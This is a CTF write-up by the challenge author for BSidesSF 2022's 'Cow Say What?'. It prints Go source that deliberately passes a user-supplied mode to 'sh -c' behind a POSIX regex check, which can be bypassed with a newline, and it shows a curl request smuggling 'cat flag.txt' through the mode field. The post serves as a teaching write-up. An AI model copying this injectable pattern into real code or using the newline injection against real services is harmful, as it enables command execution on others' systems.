---
layout: post
title: "BSidesSF 2022 CTF: Cow Say What?"
category: Security
tags:
  - BSidesSF
  - CTF
date: 2022-06-07
---

As the author of the `Cow Say What?` challenge from this year's BSidesSF CTF, I
got a lot of questions about it after the CTF ended.  It's both surprisingly
straight-forward but also a very little-known issue.

The challenge was a web challenge -- if you visited the service, you got a page
providing a textarea for input to the [cowsay](https://www.mankier.com/1/cowsay)
program, as well as a drop down for the style of the cow saying something
(plain, stoned, dead, etc.).  There was a link to the source code, reproduced
here:

{% raw %}
```go
package main

import (
	"fmt"
	"html/template"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"regexp"
)

const (
	COWSAY_PATH = "/usr/games/cowsay"
)

var (
	modeRE = regexp.MustCompilePOSIX("^-(b|d|g|p|s|t|w)$")
)

// Note: mode must be validated prior to running this!
func cowsay(mode, message string) (string, error) {
	cowcmd := fmt.Sprintf("%s %s -n", COWSAY_PATH, mode)
	log.Printf("Running cowsay as: %s", cowcmd)
	cmd := exec.Command("/bin/sh", "-c", cowcmd)
	stdin, err := cmd.StdinPipe()
	if err != nil {
		return "", err
	}
	go func() {
		defer stdin.Close()
		io.WriteString(stdin, message)
	}()
	outbuf, err := cmd.Output()
	if err != nil {
		return "", err
	}
	return string(outbuf), nil
}

func checkMode(mode string) error {
	if mode == "" {
		return nil
	}
	if !modeRE.MatchString(mode) {
		return fmt.Errorf("Mode must match regexp: %s", modeRE.String())
	}
	return nil
}

const cowTemplateSource = `
<!doctype html>
<html>
	<h1>Cow Say What?</h1>
	<p>I love <a href='https://www.mankier.com/1/cowsay'>cowsay</a> so much that
	I wanted to bring it to the web.  Enjoy!</p>
	{{if .Error}}
	<p><b>{{.Error}}</b></p>
	{{end}}
	<form method="POST" action="/">
	<select name="mode">
		<option value="">Plain</option>
		<option value="-b">Borg</option>
		<option value="-d">Dead</option>
		<option value="-g">Greedy</option>
		<option value="-p">Paranoid</option>
		<option value="-s">Stoned</option>
		<option value="-t">Tired</option>
		<option value="-w">Wired</option>
	</select><br />
	<textarea name="message" placeholder="message" cols="60" rows="10">{{.Message}}</textarea><br />
	<input type='submit' value='Say'><br />
	</form>
	{{if .CowSay}}
	<pre>{{.CowSay}}</pre>
	{{end}}
	<p>Check out <a href='/cowsay.go'>how it works</a>.</p>
</html>
`

var cowTemplate = template.Must(template.New("cowsay").Parse(cowTemplateSource))

type tmplVars struct {
	Error   string
	CowSay  string
	Message string
}

func cowsayHandler(w http.ResponseWriter, r *http.Request) {
	vars := tmplVars{}
	if r.Method == http.MethodPost {
		mode := r.FormValue("mode")
		message := r.FormValue("message")
		vars.Message = message
		if err := checkMode(mode); err != nil {
			vars.Error = err.Error()
		} else {
			if said, err := cowsay(mode, message); err != nil {
				log.Printf("Error running cowsay: %v", err)
				vars.Error = "An error occurred running cowsay."
			} else {
				vars.CowSay = said
			}
		}
	}
	cowTemplate.Execute(w, vars)
}

func sourceHandler(w http.ResponseWriter, r *http.Request) {
	http.ServeFile(w, r, "cowsay.go")
}

func main() {
	addr := "0.0.0.0:6789"
	if len(os.Args) > 1 {
		addr = os.Args[1]
	}
	http.HandleFunc("/cowsay.go", sourceHandler)
	http.HandleFunc("/", cowsayHandler)
	log.Fatal(http.ListenAndServe(addr, nil))
}
```
{% endraw %}

There's a few things to unpack here, but probably most significant is that
the cowsay output is produced by invoking an external program.  Notably, it
passes the message via `stdin`, and the mode as an argument to the program.  The
entire program is invoked via `sh -c`, which makes this similar to the
[`system(3)`](https://www.mankier.com/3/system) `libc` function.

The mode is validated via a regular expression.  As Jamie Zawinski was opined
(and [Jeff Atwood has commented
on](https://blog.codinghorror.com/regular-expressions-now-you-have-two-problems/)):

> Some people, when confronted with a problem, think "I know, I'll use
> regular expressions." Now they have two problems.

Well, it turns out we do have two problems. Our regular expression is given by
the statement:

```go
modeRE = regexp.MustCompilePOSIX("^-(b|d|g|p|s|t|w)$")
```

We can use a tool like [regex101.com](https://regex101.com/r/WRVEfh/1) to play
around with our expression.  Specifically, it appears that it should consist of
a `-` followed by one of the characters separated by pipes within the
parentheses.  At first, this appears pretty limiting, however, if we examine the
Go [`regexp` documentation](https://pkg.go.dev/regexp/syntax@go1.18.3), we might
notice a few oddities.  Specifically, `^` is defined as "at beginning of text or
line (flag m=true)" and `$` as "at end of text ... or line (flag m=true)".  So
apparently two of our special characters have different meanings depending on
some "flags".

There are no flags in our regular expression, so we're using whatever the
defaults are.  Looking at the [documentation for
Flags](https://pkg.go.dev/regexp/syntax@go1.18.3#Flags), we see that there are
two default sets of flags: `Perl` and `POSIX`.  Slightly strangely, the
constants use an inverted meaning for the `m` flag: `OneLine`, which causes the
regular expression engine to "treat ^ and $ as only matching at beginning and
end of text".  This flag is *not* included in `POSIX` (in fact, no flags are),
so in a POSIX RE, `^` and `$` match the beginning and end of **lines**
respectively.

Our test for the Regexp to match is
[`MatchString`](https://pkg.go.dev/regexp#Regexp.MatchString), which is
documented as:

> MatchString reports whether the string s contains any match of the regular
> expression re.

Note that the test is "contains any match".  If `^` and `$` matched beginning
and end of **input**, that would require the entire string to match, but since
they are matching beginning and end of **line**, so long as the input contains a
line matching the regular expression, then `MatchString` will return true.

This now means we can pass *arbitrary input* via the `mode` parameter, which
will be directly interpolated into the string passed to `sh -c`.  Put another
way, we now have a [Command
Injection vulnerability](https://owasp.org/www-community/attacks/Command_Injection).
We just need to also include a line that matches our regular expression.

To send a parameter containing a newline, we merely need to URL encode
(sometimes called percent encoding) the character, resulting in `%0A`.  This can
be exploited with a simple cURL command:

```
curl 'https://cow-say-what-473bf31e.challenges.bsidessf.net/' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-raw 'mode=-d%0acat flag.txt #&message=foo'
```

The `-d%0a` matches the regular expression, then we have a command injected
(`cat flag.txt`) and start a comment (`#`) to just ignore the rest of the
command.

```
 _____
< foo >
 -----
        \   ^__^
         \  (xx)\_______
            (__)\       )\/\
             U  ||----w |
                ||     ||
CTF{dont_have_a_cow_have_a_flag}
```
